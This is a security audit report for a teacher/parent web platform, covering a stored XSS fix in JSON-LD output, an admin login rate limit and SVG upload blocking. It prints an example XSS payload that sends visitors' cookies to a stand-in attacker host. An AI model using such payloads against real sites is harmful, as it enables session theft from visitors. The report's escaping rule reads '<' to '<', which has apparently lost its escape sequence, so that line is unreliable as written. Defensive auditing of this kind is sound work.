# Full Platform Security Audit (Prompt 84)

A comprehensive audit across all 20 listed areas. This is the first
dedicated security-only pass this platform has had — prior prompts
touched security incidentally (Prompt 57's admin auth, Prompt 68's admin
robots.txt disallow), but nothing before this walked the full list.

## Real vulnerabilities found and fixed

### 1. Stored XSS via JSON-LD structured data (the most serious finding)

Every page emitting `schema.org` structured data
(`dangerouslySetInnerHTML={{ __html: JSON.stringify(data) }}`) — 17 call
sites across 14 files — embedded the JSON string directly with no
escaping. `JSON.stringify` does not escape `<`, so a value containing the
literal substring `</script>` would prematurely close the surrounding
`<script>` tag, letting arbitrary HTML/script after it execute in every
visitor's browser.

This was exploitable today, not theoretically: a teacher's own profile
`headline`/`bio`/`name` (`buildTeacherPersonSchema`,
`teacher-public-profile-page.tsx`), a teacher's directory listing name
(`teacher-directory-structured-data.tsx`), and any resource/article title
reachable through a breadcrumb (`breadcrumb.tsx`, used on nearly every
page) are all genuine free text a teacher enters themselves — no admin
review gates what a teacher types into their own profile before it's
publicly rendered. A teacher setting their headline to
`</script><script>fetch('https://evil.example/steal?c='+document.cookie)</script>`
would have executed that script for every visitor to their public profile
page.

**Fix**: `src/lib/seo/json-ld.ts` — one function, `toJsonLdHtml()`, that
escapes every `<` to `<` before the string reaches
`dangerouslySetInnerHTML`. All 17 call sites now go through it, so this
is closed everywhere at once and any future JSON-LD addition is safe by
construction rather than by each new call site remembering to think
about it. Verified: valid JSON still round-trips correctly (checked live
against a resource page's actual rendered scripts), and a
`</script>`-containing payload no longer appears as a literal
script-closing sequence in the output (unit-tested).

### 2. No brute-force protection on the admin login

`adminLoginAction` (the real server-side gate behind `/admin`) accepted
unlimited passphrase attempts with zero throttling — a script could try
passphrases indefinitely with no penalty, leaving the passphrase's own
strength as the only defense.

**Fix**: `src/lib/admin/login-rate-limit.ts` — a minimal in-memory
throttle: locks out further attempts for 5 minutes after 5 consecutive
failures, clears on a successful login. Explicitly documented
limitations (in-memory, resets on restart, global rather than per-IP —
consistent with this app's single-shared-passphrase model, not a
multi-admin system) rather than overstating what it does. Verified live:
5 wrong attempts, then a 6th correctly returned "Too many incorrect
attempts. Try again in about 5 minutes." instead of re-checking the
passphrase.

### 3. Photo/thumbnail uploads accepted SVG (script-capable format)

`accept="image/*"` and the shared `validateUploadedFile()` both allowed
`image/svg+xml`. Every current renderer uses a plain `<img>` (which
doesn't execute embedded script in that context in any current browser),
so this wasn't exploitable today — but a profile photo or resource
thumbnail has no legitimate reason to ever need vector art, so this
closes the risk at the validation layer instead of depending on every
future use of that stored data getting its rendering context right
forever.

**Fix**: `file-validation.ts` now rejects `image/svg+xml` explicitly.
While making this change, also consolidated two other upload surfaces
(`teacher-profile-form.tsx`'s photo upload,
`teacher-resource-form.tsx`'s thumbnail upload) that had each hand-rolled
their own copy of the same MIME/size check instead of using the shared
validator — a security-relevant check should have one implementation,
not three that could silently drift apart.

## Audited and confirmed already correct (no change needed)

- **Admin authentication**: HMAC-SHA256 signed session token,
  constant-time passphrase comparison, `httpOnly`+`secure` (in
  production)+`sameSite: lax` cookie, 8-hour TTL, fails closed if env
  vars are unset. No plaintext password ever stored — a single passphrase
  is hashed and compared, never persisted.
- **Admin authorization**: `src/proxy.ts` is a real server-side gate —
  confirmed unmodified since before this whole performance/mobile arc —
  blocking every `/admin/*` request before any page component, data, or
  JS bundle is served to an unauthenticated visitor.
- **Open redirect protection**: `admin/login/page.tsx`'s
  `sanitizeRedirect()` already correctly restricts the post-login
  redirect to same-origin `/admin` paths, rejecting protocol-relative
  (`//evil.com`) and absolute URLs.
- **IDOR / cross-user data access**: structurally not applicable — there
  is no shared backend. Every parent/teacher/child/admin-viewed record
  lives only in the browser's own localStorage; an ID in a URL can only
  ever resolve to data that already exists on that same device. Admin
  detail pages (`/admin/users/children/[childId]`, etc.) handle a
  missing/invalid id with a graceful empty state, not a crash.
- **Premium-access architecture**: no resource has a real `downloadFile`
  set for a non-free tier today. Verified the architecture is also sound
  for when one is added: `canDownload()` gates the download link so a
  non-downloadable resource's file URL is never even included in the
  rendered tree, and every component touching the raw resource object
  (`ResourceCard`, the detail page itself) is a Server Component, so
  there's no client-bundle serialization path that would leak an unused
  field.
- **Environment variables**: `.env.local` (real values) is gitignored and
  was never committed; only `.env.example` (all placeholders) is tracked.
  No hardcoded secret, API key, or credential found anywhere in source
  (checked via pattern search, not just spot-checked). `ADMIN_PASSPHRASE`/
  `ADMIN_SESSION_SECRET`/`SUPABASE_SERVICE_ROLE_KEY` are all correctly
  server-only, never `NEXT_PUBLIC_`-prefixed.
- **Dependencies**: `npm audit` — 0 vulnerabilities across all 551
  resolved dependencies (prod + dev + optional + peer).
- **Error handling**: all three error boundaries (`app/error.tsx`,
  `admin/(protected)/error.tsx`, `search/error.tsx`) log to
  `console.error` only (dev-tools-visible, standard practice) and never
  render `error.message`/`error.stack` to the page.
- **Injection risk**: no `eval`, `new Function`, or dynamically
  constructed `RegExp` anywhere in the codebase. Site search is plain
  case-insensitive substring matching over static/local data — no ReDoS
  or query-injection surface.
- **Sensitive-data logging**: no `console.*` call anywhere logs a
  passphrase, password, token, or session value. The admin audit log
  (`src/lib/admin/audit-log.ts`) records only action/target/details —
  never a credential.
- **Forms**: every real form uses `zod` + `react-hook-form` with
  reasonable length limits where the data is actually persisted anywhere
  (teacher profile, teacher resources, admin content, applications,
  child profiles). Sign-in/sign-up/forgot/reset-password forms validate
  but never persist or transmit credentials anywhere — they are honest
  non-functional stubs (no account backend exists), so there's no server
  processing path for oversized input to attack.
- **File security**: no server-side file storage exists anywhere in this
  codebase, so "storage permissions," "path traversal," and "uploaded
  files becoming executable server code" don't apply — there's no server
  filesystem path or execution surface. What can be honestly enforced
  today (file-type allowlist, size cap) is enforced, and is now the one
  shared, tested implementation everywhere it's needed.

## Testing performed

- `npx tsc --noEmit` — clean.
- `npx vitest run` — 49 files, 300 tests (11 new: JSON-LD escaping,
  admin login rate-limiting, upload validation), all passing.
- `npx eslint .` — clean.
- `npx next build` — clean, all 71 routes generated, identical topology.
- `npm audit` — 0 vulnerabilities.
- Live: confirmed JSON-LD scripts still parse as valid JSON after the
  escaping change (no regression); performed 6 real admin login attempts
  against the running app and confirmed the exact lockout message
  appears on the 6th.

## Not changed

No architecture was rebuilt. No working feature was removed. All three
fixes are additive (one new escaping helper, one new rate-limit module,
one tightened validation rule) plus a small consolidation of pre-existing
duplicate upload-validation logic onto the already-existing shared
utility.
